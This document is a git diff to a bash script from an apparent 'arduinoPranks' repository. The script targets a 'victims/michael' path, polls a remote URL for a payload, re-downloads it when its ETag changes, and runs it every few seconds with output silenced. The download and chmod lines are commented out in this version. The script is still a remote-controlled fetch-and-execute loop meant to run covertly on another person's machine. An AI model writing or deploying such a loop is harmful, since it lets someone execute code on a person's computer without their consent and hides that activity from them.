@@ -8,24 +8,25 @@ SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 payloadURL="https://raw.githubusercontent.com/thiesgehrmann/arduinoPranks/master/websiteReactionPrank/victims/michael/scriptloc.txt"
 
 localPayloadLoc="$SCRIPTDIR/payload"
-localPayloadDate="$SCRIPTDIR/payload.date"
+localPayloadETag="$SCRIPTDIR/payload.etag"
 localPayloadURL="$SCRIPTDIR/payload.url"
 
 ###################################################################
 
 # Remove the payload and local values
 
-rm -rf "$localPayloadLoc" "$localPayloadDate" "$localPayloadURL"
+rm -rf "$localPayloadLoc" "$localPayloadETag" "$localPayloadURL"
 touch "$localPayloadLoc"
-touch "$localPayloadDate"
+touch "$localPayloadETag"
 touch "$localPayloadURL"
 
 ###################################################################
 
-function getURLDate(){
+function getURLETag(){
   local url="$1"
   curl -s -I "$url" \
-   | grep '^Date'
+   | grep '^ETag' \
+   | cut -d'"' -f2
 }
 
 function getPayloadURL(){
@@ -38,39 +39,43 @@ function getPayloadURL(){
 function downloadURL(){
   local url="$1"
   local outfile="$2"
+  echo "Downloading $url"
   #wget -O "$2" "$1"
+  #chmod +x "$2"
 }
 
 function downloadPayloadIfNeeded(){
 
-  local url=`getPayloadURL "$payloadURL"`
-  local localURL=`cat "$localPayloadURL"`
-  local urlDate=`getURLDate "$url"`
+  local remoteURL=`getPayloadURL "$payloadURL"`
+  local remoteURLETag=`getURLETag "$remoteURL"`
 
-  echo "$localURL -> $url"
+  localURL=`head -n1 "$localPayloadURL"`
+  localETag=`head -n1 "$localPayloadETag"`
+
+  echo "$localURL -> $remoteURL"
+  echo "$localETag -> $remoteURLETag"
 
     # We have a totally new URL, we should get it no matter what!
-  if [ "$url" != "$localURL" ]; then
+  if [ "$remoteURL" != "$localURL" ]; then
     echo "We have a new URL!"
-    downloadURL "$url" "$localPayloadLoc"
-    echo "$url" > "$localPayloadURL"
-    echo "$urlDate" > "$localPayloadDate"
+    downloadURL "$remoteURL" "$localPayloadLoc"
+    echo "$remoteURL" > "$localPayloadURL"
+    echo "$remoteURLETag" > "$localPayloadETag"
 
   else
     echo "Same URL"
-    local localDate=`cat "$localPayloadDate"`
 
-    if [ "$localDate" != "$urlDate" ]; then
+    if [ "$localETag" != "$remoteURLETag" ]; then
       echo "The payload has been updated!"
-      downloadURL "$url" "$localPayloadLoc"
-      local urlDate=`getPayloadDate "$url"`
+      downloadURL "$remoteURL" "$localPayloadLoc"
+      echo "$remoteURLETag" > "$localPayloadETag"
     fi
   fi
 
 }
 
 function runPayload() {
-  "$localPayloadLoc"
+  "$localPayloadLoc" &> /dev/null
 }
 
 ###################################################################
@@ -85,6 +90,6 @@ while [ true ]; do
 
   runPayload
 
-  sleep 15
+  sleep 5
 
 done
